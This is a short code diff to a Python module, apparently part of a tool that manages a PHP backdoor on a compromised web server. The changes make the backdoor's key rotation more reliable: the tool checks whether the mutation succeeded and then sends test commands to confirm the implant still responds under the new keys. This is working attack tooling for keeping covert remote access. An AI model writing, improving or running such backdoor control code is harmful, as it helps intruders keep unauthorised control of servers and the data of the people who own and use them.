@@ -373,10 +373,25 @@ class MutateModule(Module):
         php = mutation_php(new_backdoor, ctx.config.Z)
         out = ctx.send(php)
         print(out)
+        if "Mutated successfully" not in out:
+            print("[!] Mutation failed — Z/V NOT updated. Check output above.")
+            return None
         ctx.config.Z = Zt
         ctx.config.V = Vt
         ctx.config.save_global()
-        print("Config updated to new Z, V. Use gen to see payload for other files.")
+        print("Config updated. Verifying connection with new Z/V...")
+        import time as _time
+        verify = None
+        for _attempt in range(3):
+            verify = ctx.send("echo 'mutate_ok';")
+            if verify.strip() == "mutate_ok":
+                break
+            _time.sleep(1)
+        if verify and verify.strip() == "mutate_ok":
+            print("Connection verified with new credentials.")
+        else:
+            print(f"[!] WARNING: new Z/V not responding after 3 attempts: {verify!r}")
+            print("Backdoor may be broken. Use 'gen' to check current payload.")
         return None
 
 
